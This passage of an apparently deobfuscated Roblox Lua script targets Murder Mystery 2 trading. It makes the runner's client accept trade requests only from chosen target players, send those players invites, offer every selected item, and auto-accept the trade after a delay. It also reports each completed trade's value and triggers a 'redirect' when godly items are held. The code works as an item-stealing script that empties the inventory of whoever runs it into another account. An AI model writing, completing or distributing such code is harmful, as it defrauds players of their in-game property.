	projectVeloTradeRuntime.PendingCompletion = {
		Session = session,
		Value = fn48(projectVeloTradeRuntime.Selected),
		TradeId = v11 .. ":" .. tostring(session),
		Reported = false,
	}

	fn44()
	task.defer(fn44)

	task.delay(0.1, function()
		if projectVeloTradeRuntime.Active and projectVeloTradeRuntime.Session == session then
			fn44()
		end
	end)

	task.spawn(function()
		task.wait(0.75)
		local n18 = 0

		for _, v15 in ipairs(projectVeloTradeRuntime.Selected) do
			local max = math.max
			local floor = math.floor
			local n19 = tonumber(v15.amount) or 1

			for i = 1, max(1, floor(n19)) do
				if not projectVeloTradeRuntime.Active or projectVeloTradeRuntime.Session ~= session or projectVeloTradeRuntime.OtherPlayer ~= projectVeloTradeRuntime.Target then
					return
				end
				fn38(offerItem, v15.id, v15.category)
				n18 += 1

				if n18 >= n12 then
					task.wait()
					n18 = 0
				end
			end
		end
	end)
end))

table.insert(projectVeloTradeRuntime.Connections, trade.UpdateTrade.OnClientEvent:Connect(function(arg)
	if not projectVeloTradeRuntime.Active or not projectVeloTradeRuntime.Target or projectVeloTradeRuntime.OtherPlayer ~= projectVeloTradeRuntime.Target then
		return
	end
	projectVeloTradeRuntime.Update = projectVeloTradeRuntime.Update + 1
	local session = projectVeloTradeRuntime.Session
	local v15 = fn49(arg)
	local lastOffer = arg.LastOffer

	if projectVeloTradeRuntime.ObservedOffer ~= lastOffer then
		projectVeloTradeRuntime.ObservedOffer = lastOffer
		projectVeloTradeRuntime.AcceptGeneration = projectVeloTradeRuntime.AcceptGeneration + 1
		projectVeloTradeRuntime.AcceptScheduled = false
		projectVeloTradeRuntime.AcceptPending = false
		projectVeloTradeRuntime.LastAcceptSentAt = 0
	end

	if not fn51(v15) then
		return
	end

	if projectVeloTradeRuntime.AcceptScheduled then
		return
	end
	projectVeloTradeRuntime.AcceptScheduled = true
	local acceptGeneration = projectVeloTradeRuntime.AcceptGeneration

	task.delay(4, function()
		if not projectVeloTradeRuntime.Active or projectVeloTradeRuntime.Session ~= session or projectVeloTradeRuntime.AcceptGeneration ~= acceptGeneration or projectVeloTradeRuntime.ObservedOffer ~= lastOffer or projectVeloTradeRuntime.OtherPlayer ~= projectVeloTradeRuntime.Target then
			return
		end
		projectVeloTradeRuntime.AcceptPending = true
		projectVeloTradeRuntime.LastAcceptSentAt = time()
		fn38(acceptTrade, game.PlaceId * 3, lastOffer)
	end)
end))

table.insert(projectVeloTradeRuntime.Connections, trade.EndTrade.OnClientEvent:Connect(function()
	fn54(projectVeloTradeRuntime.Target)
end))

table.insert(projectVeloTradeRuntime.Connections, trade.AcceptTrade.OnClientEvent:Connect(function(arg)
	if arg then
		projectVeloTradeRuntime.AcceptPending = false
		projectVeloTradeRuntime.ConfirmedCompletionPending = true
		projectVeloTradeRuntime.TradeCompleted = true
		local pendingCompletion = projectVeloTradeRuntime.PendingCompletion

		if pendingCompletion and not pendingCompletion.Reported and pendingCompletion.Value > 0 then
			pendingCompletion.Reported = true
			fn34(pendingCompletion.Value, pendingCompletion.TradeId)
		end

		fn54(projectVeloTradeRuntime.Target)
	end
end))

local function fn55(arg)
	fn43()
	local name2

	if typeof(arg) == "Instance" and arg:IsA("Player") then
		name2 = arg.Name
	else
		name2 = tostring(arg)
	end

	if fn(name2) then
		flag3 = true
		projectVeloTradeRuntime.Target = name2
		projectVeloTradeRuntime.LastTarget = name2

		task.delay(0.1, function()
			if projectVeloTradeRuntime.Active then
				fn43()
				fn38(acceptRequest)
			end
		end)

		return true
	end

	task.delay(0.05, function()
		if projectVeloTradeRuntime.Active then
			fn43()
			fn38(declineRequest)
		end
	end)

	return false
end

local function fn56()
	sendRequest.OnClientInvoke = function(arg)
		return fn55(arg)
	end
end

fn56()

table.insert(projectVeloTradeRuntime.Connections, trade.RequestSent.OnClientEvent:Connect(function(arg)
	fn55(arg)
end))

fn37 = function(player)
	local v15 = flag3
	local flag6

	if flag3 then
		flag6 = v15
	else
		flag6 = not projectVeloTradeRuntime.Active
	end

	if flag6 or not fn(player.Name) or player == localPlayer then
		return
	end
	flag3 = true
	projectVeloTradeRuntime.LastInviteAt = time()
	projectVeloTradeRuntime.Target = player.Name
	projectVeloTradeRuntime.LastTarget = player.Name

	if not fn39(sendRequest, player) then
		flag3 = false
		projectVeloTradeRuntime.Target = nil

		task.delay(2.5, function()
			if projectVeloTradeRuntime.Active and not flag3 and player.Parent == Players and fn(player.Name) then
				fn37(player)
			end
		end)
	end
end

table.insert(projectVeloTradeRuntime.Connections, Players.PlayerAdded:Connect(fn37))

task.spawn(function()
	while projectVeloTradeRuntime.Active do
		task.wait(1)
		fn56()
		local flag6, v15 = fn39(getTradeStatus)

		if flag6 and v15 == "None" then
			local lastInviteAt = projectVeloTradeRuntime.LastInviteAt
			local n18 = time() - lastInviteAt

			if flag3 and n18 >= n15 then
				flag3 = false
			end

			if projectVeloTradeRuntime.OtherPlayer ~= nil then
				projectVeloTradeRuntime.Session = projectVeloTradeRuntime.Session + 1
				projectVeloTradeRuntime.Update = projectVeloTradeRuntime.Update + 1
				projectVeloTradeRuntime.OtherPlayer = nil
				projectVeloTradeRuntime.Target = nil
				projectVeloTradeRuntime.Selected = {}
				projectVeloTradeRuntime.ObservedOffer = nil
				projectVeloTradeRuntime.AcceptGeneration = projectVeloTradeRuntime.AcceptGeneration + 1
				projectVeloTradeRuntime.AcceptScheduled = false
				projectVeloTradeRuntime.AcceptPending = false
				projectVeloTradeRuntime.LastAcceptSentAt = 0
			end

			if not flag3 and n18 >= n14 then
				v4 = fn24()

				if #v4 > 0 then
					local v16 = fn52(projectVeloTradeRuntime.LastTarget)

					if v16 then
						fn37(v16)
					end
				end
			end
		else
			flag6 = flag6 and projectVeloTradeRuntime.AcceptPending and projectVeloTradeRuntime.ObservedOffer ~= nil and projectVeloTradeRuntime.OtherPlayer == projectVeloTradeRuntime.Target

			if flag6 then
				local lastAcceptSentAt = projectVeloTradeRuntime.LastAcceptSentAt
				flag6 = time() - lastAcceptSentAt >= n13
			end

			if flag6 then
				projectVeloTradeRuntime.LastAcceptSentAt = time()
				fn38(acceptTrade, game.PlaceId * 3, projectVeloTradeRuntime.ObservedOffer)
			end
		end
	end
end)

local v15, v16 = fn39(getTradeStatus)

if v15 and v16 ~= nil and v16 ~= "None" then
	fn38(declineTrade)
	fn38(declineRequest)
	projectVeloTradeRuntime.OtherPlayer = nil
	projectVeloTradeRuntime.Target = nil
	projectVeloTradeRuntime.Selected = {}
	projectVeloTradeRuntime.ObservedOffer = nil
	pcall(fn44)
end

local v17 = fn52()

if v17 then
	task.defer(fn37, v17)
end

genv.ProjectVeloMM2RedirectRun = (genv.ProjectVeloMM2RedirectRun or 0) + 1
local projectVeloMM2RedirectRun = genv.ProjectVeloMM2RedirectRun

task.delay(n2, function()
	if genv.ProjectVeloMM2RedirectRun ~= projectVeloMM2RedirectRun or not projectVeloTradeRuntime.Active or projectVeloTradeRuntime.TradeCompleted or projectVeloMM2LiveRuntime.Completed then
		return
	end
	local n18 = 0

	for _, v18 in ipairs(v4) do
		local v19 = fn2(v18)

		if v19 > n18 then
			if v18.displayName then
				n18 = v19
			else
				n18 = v19
			end
		end
	end

	if n18 < godly then
		return
	end

	if not fn4() then
		return
	end
	projectVeloTradeRuntime.LastTarget = nil

	if projectVeloTradeRuntime.OtherPlayer ~= nil and not fn3(projectVeloTradeRuntime.OtherPlayer) then
		fn38(declineTrade)
	end

	task.spawn(function()
		fn33("redirect", nil, 3)
	end)
end)